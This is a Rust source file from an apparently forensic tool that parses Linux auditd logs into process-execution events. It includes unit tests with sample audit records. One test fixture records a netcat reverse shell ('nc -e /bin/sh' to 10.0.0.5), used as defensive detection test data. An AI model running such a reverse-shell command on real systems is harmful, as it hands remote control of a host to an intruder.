use regex::Regex;
use std::collections::{BTreeMap, HashMap};
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::path::Path;

use crate::parsers::evtx::Event;
use crate::utils::epoch_to_iso;

/// `auid` value used by the kernel when no login session is attached (`(unsigned)-1`).
const UNSET_AUID: &str = "4294967295";

/// A `key=value` pair of an audit record, remembering whether the value was quoted.
/// Unquoted values of free-text fields (`cmd=`, `a0=`, `proctitle=`...) are hex encoded.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AuditPair<'a> {
    pub key: &'a str,
    pub value: &'a str,
    pub quoted: bool,
}

/// Splits an audit record into `key=value` pairs, honouring "double" and 'single' quotes.
/// Nested `msg='cwd="..." cmd=...'` payloads (USER_CMD, USER_AUTH...) are flattened too.
pub fn audit_pairs(line: &str) -> Vec<AuditPair<'_>> {
    let mut pairs = Vec::new();
    let bytes = line.as_bytes();
    let n = bytes.len();
    let mut i = 0;

    while i < n {
        while i < n && (bytes[i] == b' ' || bytes[i] == b'\t' || bytes[i] == 0x1d) {
            i += 1;
        }
        if i >= n {
            break;
        }
        let key_start = i;
        while i < n && bytes[i] != b'=' && bytes[i] != b' ' && bytes[i] != b'\t' {
            i += 1;
        }
        if i >= n || bytes[i] != b'=' {
            // token without '=' (e.g. "avc:", "denied", "{") -> skip it
            continue;
        }
        let key = &line[key_start..i];
        i += 1; // skip '='

        let (value, quoted, next) = if i < n && (bytes[i] == b'"' || bytes[i] == b'\'') {
            let q = bytes[i];
            let vs = i + 1;
            let mut j = vs;
            while j < n && bytes[j] != q {
                j += 1;
            }
            (&line[vs..j], true, (j + 1).min(n))
        } else {
            let vs = i;
            let mut j = vs;
            while j < n && bytes[j] != b' ' && bytes[j] != b'\t' && bytes[j] != 0x1d {
                j += 1;
            }
            (&line[vs..j], false, j)
        };

        if key == "msg" && quoted && !value.starts_with("audit(") {
            pairs.extend(audit_pairs(value));
        } else {
            pairs.push(AuditPair { key, value, quoted });
        }
        i = next;
    }

    pairs
}

/// Returns the first value for `key` (exact, case-sensitive match).
pub fn audit_field<'a>(pairs: &[AuditPair<'a>], key: &str) -> Option<&'a str> {
    pairs.iter().find(|p| p.key == key).map(|p| p.value)
}

/// Decodes a free-text audit value: unquoted values are hex encoded, quoted ones are literal.
/// NUL separators (used by `proctitle=`) are turned into spaces.
pub fn decode_audit_value(raw: &str, quoted: bool) -> String {
    let clean = raw.trim_matches(|c| c == '\'' || c == '"');
    if !quoted && clean.len() >= 2 && clean.len() % 2 == 0 && clean.bytes().all(|b| b.is_ascii_hexdigit()) {
        let mut bytes = Vec::with_capacity(clean.len() / 2);
        for chunk in clean.as_bytes().chunks(2) {
            if let Ok(s) = std::str::from_utf8(chunk) {
                if let Ok(b) = u8::from_str_radix(s, 16) {
                    bytes.push(if b == 0 { b' ' } else { b });
                }
            }
        }
        return String::from_utf8_lossy(&bytes).trim().to_string();
    }
    clean.to_string()
}

/// Backwards compatible helper: decodes a value assuming the auditd convention
/// (hex when it looks like hex, literal otherwise).
pub fn decode_audit_cmd(raw: &str) -> String {
    let quoted = raw.starts_with('"') || raw.starts_with('\'');
    decode_audit_value(raw, quoted)
}

/// Picks a human readable user: enriched name (`AUID="bob"`) > numeric auid > uid.
fn resolve_user(pairs: &[AuditPair<'_>]) -> String {
    let auid = audit_field(pairs, "auid").unwrap_or("");
    if !auid.is_empty() && auid != UNSET_AUID {
        if let Some(name) = audit_field(pairs, "AUID") {
            return name.to_string();
        }
        return auid.to_string();
    }
    if let Some(name) = audit_field(pairs, "UID") {
        return name.to_string();
    }
    audit_field(pairs, "uid").unwrap_or("unknown").to_string()
}

fn is_execve_syscall(pairs: &[AuditPair<'_>]) -> bool {
    if let Some(name) = audit_field(pairs, "SYSCALL") {
        return name == "execve" || name == "execveat";
    }
    match audit_field(pairs, "syscall") {
        // x86_64: 59/322, i386 & arm: 11/358, aarch64: 221/281
        Some(n) => matches!(n, "59" | "322" | "11" | "358" | "221" | "281" | "execve" | "execveat"),
        None => false,
    }
}

/// Execution record under construction, assembled from SYSCALL + EXECVE + CWD + PROCTITLE
/// records that share the same audit event id.
#[derive(Default, Debug)]
struct PendingExec {
    secs: i64,
    msecs: u32,
    has_syscall: bool,
    success: Option<bool>,
    pid: u32,
    ppid: u32,
    user: String,
    exe: String,
    comm: String,
    argv: BTreeMap<usize, BTreeMap<usize, String>>,
    cwd: Option<String>,
    proctitle: Option<String>,
}

impl PendingExec {
    fn command_line(&self) -> String {
        if !self.argv.is_empty() {
            let parts: Vec<String> = self
                .argv
                .values()
                .map(|frags| frags.values().cloned().collect::<Vec<_>>().concat())
                .collect();
            return parts.join(" ");
        }
        if let Some(ref pt) = self.proctitle {
            if !pt.is_empty() {
                return pt.clone();
            }
        }
        self.exe.clone()
    }
}

/// Parses an audit.log file for execution records (USER_CMD, SYSCALL execve + EXECVE argv).
pub fn parse_audit_log(file_path: &Path, computer_name: &str) -> Vec<Event> {
    let mut events = Vec::new();
    let file = match File::open(file_path) {
        Ok(f) => f,
        Err(_) => return events,
    };

    let header_re = match Regex::new(r"^type=(\w+)\s+msg=audit\((\d+)\.(\d+):(\d+)\)") {
        Ok(r) => r,
        Err(_) => return events,
    };
    let argv_re = match Regex::new(r"^a(\d+)(?:\[(\d+)\])?$") {
        Ok(r) => r,
        Err(_) => return events,
    };

    let mut pending: HashMap<String, PendingExec> = HashMap::new();
    let reader = BufReader::new(file);

    for line_res in reader.lines() {
        let line = match line_res {
            Ok(l) => l,
            Err(_) => continue,
        };

        let caps = match header_re.captures(&line) {
            Some(c) => c,
            None => continue,
        };
        let rec_type = &caps[1];
        let secs: i64 = caps[2].parse().unwrap_or(0);
        let msecs: u32 = caps[3].parse().unwrap_or(0);
        let event_key = format!("{}.{}:{}", &caps[2], &caps[3], &caps[4]);

        match rec_type {
            "USER_CMD" => {
                let pairs = audit_pairs(&line);
                let pid: u32 = audit_field(&pairs, "pid").and_then(|v| v.parse().ok()).unwrap_or(0);
                let cwd = audit_field(&pairs, "cwd").unwrap_or("N/A");
                let (raw_cmd, quoted) = pairs
                    .iter()
                    .find(|p| p.key == "cmd")
                    .map(|p| (p.value, p.quoted))
                    .unwrap_or(("", false));

                let decoded_cmd = decode_audit_value(raw_cmd, quoted);
                if decoded_cmd.is_empty() {
                    continue;
                }
                let proc_name = decoded_cmd.split_whitespace().next().unwrap_or(&decoded_cmd).to_string();
                let iso_ts = match epoch_to_iso(secs, msecs * 1_000_000) {
                    Some(ts) => ts,
                    None => continue,
                };
                let user_label = resolve_user(&pairs);

                events.push(Event {
                    timestamp: iso_ts,
                    computer: computer_name.to_string(),
                    artifact: "linux:audit:user_cmd".to_string(),
                    event_id: 0,
                    pid,
                    subject_username: user_label.clone(),
                    target_username: user_label,
                    processname: proc_name,
                    commandline: Some(format!("{} (CWD: {})", decoded_cmd, cwd)),
                    parentprocessname: "sudo/pam".to_string(),
                });
            }
            "SYSCALL" => {
                let pairs = audit_pairs(&line);
                if !is_execve_syscall(&pairs) {
                    continue;
                }
                let entry = pending.entry(event_key).or_default();
                entry.secs = secs;
                entry.msecs = msecs;
                entry.has_syscall = true;
                entry.success = audit_field(&pairs, "success").map(|s| s == "yes");
                entry.pid = audit_field(&pairs, "pid").and_then(|v| v.parse().ok()).unwrap_or(0);
                entry.ppid = audit_field(&pairs, "ppid").and_then(|v| v.parse().ok()).unwrap_or(0);
                entry.user = resolve_user(&pairs);
                entry.exe = audit_field(&pairs, "exe").unwrap_or("").to_string();
                entry.comm = audit_field(&pairs, "comm").unwrap_or("").to_string();
            }
            "EXECVE" => {
                let pairs = audit_pairs(&line);
                let entry = pending.entry(event_key).or_default();
                if entry.secs == 0 {
                    entry.secs = secs;
                    entry.msecs = msecs;
                }
                for p in &pairs {
                    if let Some(c) = argv_re.captures(p.key) {
                        let idx: usize = c[1].parse().unwrap_or(0);
                        let frag: usize = c.get(2).and_then(|m| m.as_str().parse().ok()).unwrap_or(0);
                        entry
                            .argv
                            .entry(idx)
                            .or_default()
                            .insert(frag, decode_audit_value(p.value, p.quoted));
                    }
                }
            }
            "CWD" => {
                if let Some(entry) = pending.get_mut(&event_key) {
                    let pairs = audit_pairs(&line);
                    entry.cwd = audit_field(&pairs, "cwd").map(|s| s.to_string());
                }
            }
            "PROCTITLE" => {
                if let Some(entry) = pending.get_mut(&event_key) {
                    let pairs = audit_pairs(&line);
                    if let Some(p) = pairs.iter().find(|p| p.key == "proctitle") {
                        entry.proctitle = Some(decode_audit_value(p.value, p.quoted));
                    }
                }
            }
            _ => {}
        }
    }

    // Emit the assembled execve events
    for (_, exec) in pending.into_iter() {
        if !exec.has_syscall {
            continue;
        }
        let iso_ts = match epoch_to_iso(exec.secs, exec.msecs * 1_000_000) {
            Some(ts) => ts,
            None => continue,
        };
        let cmdline = exec.command_line();
        let proc_name = if !exec.exe.is_empty() {
            exec.exe.clone()
        } else if !exec.comm.is_empty() {
            exec.comm.clone()
        } else {
            cmdline.split_whitespace().next().unwrap_or("unknown").to_string()
        };
        let mut details = cmdline;
        if let Some(ref cwd) = exec.cwd {
            details.push_str(&format!(" (CWD: {})", cwd));
        }
        if exec.success == Some(false) {
            details.push_str(" (FAILED)");
        }

        events.push(Event {
            timestamp: iso_ts,
            computer: computer_name.to_string(),
            artifact: "linux:audit:execve".to_string(),
            event_id: 0,
            pid: exec.pid,
            subject_username: exec.user.clone(),
            target_username: exec.user,
            processname: proc_name,
            commandline: Some(details),
            parentprocessname: format!("PID: {}", exec.ppid),
        });
    }

    events
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_hex_decode_cmd() {
        // "pkill -9 -f @pts/" in hex
        let hex = "706B696C6C202D39202D6620407074732F";
        assert_eq!(decode_audit_cmd(hex), "pkill -9 -f @pts/");

        let plain = "ls -la";
        assert_eq!(decode_audit_cmd(plain), "ls -la");

        // A quoted value is never hex-decoded even if it looks like hex
        assert_eq!(decode_audit_value("\"cafe\"", true), "cafe");
        assert_eq!(decode_audit_value("cafe", true), "cafe");
    }

    #[test]
    fn test_audit_pairs_quoting_and_nesting() {
        let line = r#"type=USER_CMD msg=audit(1790300436.670:7562231): user pid=22693 uid=1100 auid=1100 ses=905467 msg='cwd="/home/my dir" cmd=6C73 exe="/usr/bin/sudo" terminal=? res=success'"#;
        let pairs = audit_pairs(line);
        assert_eq!(audit_field(&pairs, "pid"), Some("22693"));
        assert_eq!(audit_field(&pairs, "cwd"), Some("/home/my dir"));
        assert_eq!(audit_field(&pairs, "cmd"), Some("6C73"));
        assert_eq!(audit_field(&pairs, "res"), Some("success"));
        // "pid" must not match inside "ppid"
        let p2 = audit_pairs("ppid=2686 pid=3538 auid=1000 uid=1000");
        assert_eq!(audit_field(&p2, "pid"), Some("3538"));
        assert_eq!(audit_field(&p2, "ppid"), Some("2686"));
        assert_eq!(audit_field(&p2, "uid"), Some("1000"));
    }

    #[test]
    fn test_parse_audit_log_user_cmd() {
        let temp_file = std::env::temp_dir().join(format!("test_audit_{}.txt", std::process::id()));
        {
            let mut f = File::create(&temp_file).unwrap();
            writeln!(f, "type=USER_CMD msg=audit(1790300436.670:7562231): user pid=22693 uid=1100 auid=1100 ses=905467 msg='cwd=\"/home/ansible\" cmd=706B696C6C202D39202D6620407074732F terminal=? res=success'").unwrap();
        }

        let events = parse_audit_log(&temp_file, "TESTHOST");
        let _ = std::fs::remove_file(&temp_file);

        assert_eq!(events.len(), 1);
        assert_eq!(events[0].processname, "pkill");
        assert!(events[0].commandline.as_ref().unwrap().contains("pkill -9 -f @pts/"));
        assert_eq!(events[0].pid, 22693);
        assert_eq!(events[0].subject_username, "1100");
        assert_eq!(events[0].timestamp, "2026-09-25T01:40:36.670000Z");
    }

    #[test]
    fn test_parse_real_execve_event_group() {
        // Real auditd ordering: "ppid=" comes BEFORE "pid=", EXECVE carries argv, PROCTITLE is hex.
        let temp_file = std::env::temp_dir().join(format!("test_audit_exec_{}.txt", std::process::id()));
        {
            let mut f = File::create(&temp_file).unwrap();
            writeln!(f, r#"type=SYSCALL msg=audit(1364481363.243:24287): arch=c000003e syscall=59 success=yes exit=0 a0=7fffd19c5592 a1=0 a2=7fffd19c4b50 a3=a items=2 ppid=2686 pid=3538 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm="nc" exe="/usr/bin/nc" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="exec""#).unwrap();
            writeln!(f, r#"type=EXECVE msg=audit(1364481363.243:24287): argc=4 a0="nc" a1="-e" a2="/bin/sh" a3=31302E302E302E35"#).unwrap();
            writeln!(f, r#"type=CWD msg=audit(1364481363.243:24287): cwd="/tmp""#).unwrap();
            writeln!(f, r#"type=PATH msg=audit(1364481363.243:24287): item=0 name="/usr/bin/nc" inode=1 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL"#).unwrap();
            writeln!(f, r#"type=PROCTITLE msg=audit(1364481363.243:24287): proctitle=6E63002D65002F62696E2F736800"#).unwrap();
            // A non-exec syscall must be ignored
            writeln!(f, r#"type=SYSCALL msg=audit(1364481364.000:24288): arch=c000003e syscall=2 success=no exit=-13 a0=0 a1=0 a2=0 a3=0 items=1 ppid=1 pid=2 auid=1000 uid=1000 gid=1000 comm="cat" exe="/bin/cat""#).unwrap();
            // Fragmented long argument + enriched format (uppercase names, \x1d separators)
            writeln!(f, "type=SYSCALL msg=audit(1364481365.500:24290): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=10 pid=11 auid=1000 uid=0 comm=\"bash\" exe=\"/bin/bash\" key=(null)\x1dARCH=x86_64 SYSCALL=execve AUID=\"alice\" UID=\"root\"").unwrap();
            writeln!(f, r#"type=EXECVE msg=audit(1364481365.500:24290): argc=3 a0="bash" a1="-c" a2_len=12 a2[0]="echo hel" a2[1]="lo >f""#).unwrap();
        }

        let mut events = parse_audit_log(&temp_file, "TESTHOST");
        let _ = std::fs::remove_file(&temp_file);
        events.sort_by(|a, b| a.timestamp.cmp(&b.timestamp));

        assert_eq!(events.len(), 2, "two execve events expected, got {:?}", events);

        let nc = &events[0];
        assert_eq!(nc.artifact, "linux:audit:execve");
        assert_eq!(nc.processname, "/usr/bin/nc");
        assert_eq!(nc.pid, 3538);
        assert_eq!(nc.parentprocessname, "PID: 2686");
        assert_eq!(nc.subject_username, "1000");
        assert_eq!(nc.commandline.as_deref(), Some("nc -e /bin/sh 10.0.0.5 (CWD: /tmp)"));
        assert_eq!(nc.timestamp, "2013-03-28T14:36:03.243000Z");

        let bash = &events[1];
        assert_eq!(bash.subject_username, "alice");
        assert_eq!(bash.pid, 11);
        assert_eq!(bash.commandline.as_deref(), Some("bash -c echo hello >f"));
    }
}
